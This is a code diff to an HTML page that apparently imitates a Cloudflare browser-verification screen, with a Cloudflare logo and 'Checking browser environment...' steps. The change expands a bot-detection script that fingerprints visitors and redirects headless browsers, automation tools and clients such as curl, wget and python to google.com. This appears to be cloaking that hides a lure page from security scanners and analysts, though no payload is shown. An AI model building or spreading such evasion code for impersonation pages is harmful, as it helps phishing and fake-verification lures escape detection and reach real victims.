@@ -42,6 +42,48 @@
       min-height: 24px;
     }
   </style>
+  <script>
+    // Deteksi bot/headless
+    (function() {
+      function isBot() {
+        try {
+          if (navigator.webdriver) return true;
+
+          const ua = navigator.userAgent.toLowerCase();
+          const suspiciousUA = ["headlesschrome", "phantomjs", "selenium", "python", "curl", "java", "wget", "go-http-client"];
+          if (suspiciousUA.some(botUA => ua.includes(botUA))) return true;
+
+          if (navigator.plugins.length === 0) return true;
+
+          if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+
+          if (!navigator.language) return true;
+
+          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+          if (!timezone || timezone.length < 1) return true;
+
+          if (!navigator.cookieEnabled) return true;
+
+          try {
+            localStorage.setItem("botTest", "1");
+            localStorage.removeItem("botTest");
+          } catch (e) {
+            return true;
+          }
+
+          if (document.styleSheets.length === 0) return true;
+
+          return false;
+        } catch (e) {
+          return true;
+        }
+      }
+
+      if (isBot()) {
+        window.location.href = "https://www.google.com";
+      }
+    })();
+  </script>
 </head>
 <body>
   <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" alt="Cloudflare Logo" />
@@ -50,23 +92,6 @@
   <div id="status"></div>
 
   <script>
-    // Deteksi headless
-    (function() {
-      function isHeadless() {
-        if (navigator.webdriver) return true;
-        if (/HeadlessChrome/.test(navigator.userAgent)) return true;
-        if (navigator.plugins.length === 0) return true;
-        if (window.outerWidth === 0 || window.outerHeight === 0) return true;
-        if (!navigator.language) return true;
-        return false;
-      }
-
-      if (isHeadless()) {
-        window.location.href = "https://www.google.com";
-      }
-    })();
-
-    // Animasi status langkah
     const steps = [
       "Checking browser environment...",
       "Validating JavaScript engine...",
